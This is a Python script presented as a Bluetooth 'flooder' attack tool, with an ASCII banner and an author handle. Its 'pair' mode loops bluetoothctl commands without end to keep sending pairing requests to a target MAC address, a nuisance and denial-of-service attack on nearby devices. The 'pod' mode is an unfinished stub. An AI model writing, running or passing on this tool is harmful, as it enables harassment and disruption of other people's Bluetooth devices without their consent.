import os
import sys
import subprocess
import time
import threading
 
 
def run_cmd(command: str):
        """ Execute shell commands and return STDOUT """
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
 
        return stdout.decode("utf-8")
 
print("___.    __  .__      _____.__                    .___            \n\\_ |___/  |_|  |   _/ ____\\  |   ____   ____   __| _/___________ \n | __ \\   __\\  |   \\   __\\|  |  /  _ \\ /  _ \\ / __ |/ __ \\_  __ \\\n | \\_\\ \\  | |  |__  |  |  |  |_(  <_> |  <_> ) /_/ \\  ___/|  | \\/\n |___  /__| |____/  |__|  |____/\\____/ \\____/\\____ |\\___  >__|   \n     \\/                                           \\/    \\/       ")
print("widow9098#0353")
 
if (len(sys.argv) != 4):
    print("methods: pair/pod")
    print(sys.argv[0] + " <method> <mac> <threads>")    
else:
    method = sys.argv[1]
    macadd = sys.argv[2]
    threadnum = sys.argv[3]
 
 
    if (method == "pod"):
        #start pod attack
        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
    elif (method == "pair"):
        def loopback():
            while True:

                run_cmd("bluetoothctl power on") 
                run_cmd("bluetoothctl discoverable on") 
                run_cmd("bluetoothctl pairable on") 
                run_cmd("bluetoothctl agent on") 
                run_cmd("bluetoothctl default-agent") 
                run_cmd("timeout 1s bluetoothctl scan on")  
                run_cmd("timeout 2s bluetoothctl pair " + macadd) 
                print("sent packet")
        #start pair attack
        
        print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
        threading.Thread(target = loopback).start()


    else:
        print("u fucked up the cmd")
 
 
